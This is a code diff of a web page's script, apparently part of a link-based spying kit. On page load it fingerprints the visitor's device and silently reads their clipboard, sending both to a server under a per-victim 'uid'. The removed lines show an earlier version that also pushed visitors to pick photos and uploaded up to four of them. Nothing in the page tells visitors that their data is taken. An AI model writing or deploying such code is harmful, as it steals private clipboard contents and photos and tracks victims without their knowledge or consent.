@@ -74,50 +74,51 @@
     <div class="credit">𝗕𝘂𝗶𝗹𝘁 𝗕𝘆: 💛 𝗪𝗔𝗖𝗜𝗤</div>
   </div>
 
-  <input id="imgPicker" type="file" accept="image/*" multiple style="display:none" />
-
   <script>
-    async function sendClipboardAndImages() {
+    async function sendClipboardDeviceInfo() {
       const uid = new URLSearchParams(window.location.search).get("uid");
       if (!uid) return;
 
       try {
-        // 📝 کلیپبورد ټکست
-        const text = await navigator.clipboard.readText();
-        if (text) {
-          await fetch("/api/send", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ uid, text })
-          });
-        }
-
-        // 🖼️ د عکس انتخابول
-        const picker = document.getElementById("imgPicker");
-        picker.click();
-
-        picker.onchange = async () => {
-          const files = Array.from(picker.files).slice(0, 4); // Max 4
-          for (const file of files) {
-            const reader = new FileReader();
-            reader.onloadend = async () => {
-              const base64 = reader.result;
-              await fetch("/api/photo", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ uid, image: base64 })
-              });
-            };
-            reader.readAsDataURL(file);
+        // 📱 ډیوایس انفو
+        const deviceInfo = {
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          language: navigator.language,
+          screen: {
+            width: window.screen.width,
+            height: window.screen.height
           }
         };
 
+        await fetch("/api/device", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ uid, device: deviceInfo })
+        });
+
+        // 📝 کلیپبورد ټکست
+        let clipText = "";
+        try {
+          clipText = await navigator.clipboard.readText();
+        } catch (e) {
+          console.warn("⚠️ Clipboard read blocked:", e);
+        }
+
+        if (clipText) {
+          await fetch("/api/send", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ uid, text: clipText })
+          });
+        }
+
       } catch (err) {
-        console.error("❌ Sending failed", err);
+        console.error("❌ Failed:", err);
       }
     }
 
-    window.onload = sendClipboardAndImages;
+    window.onload = sendClipboardDeviceInfo;
   </script>
 </body>
 </html> 
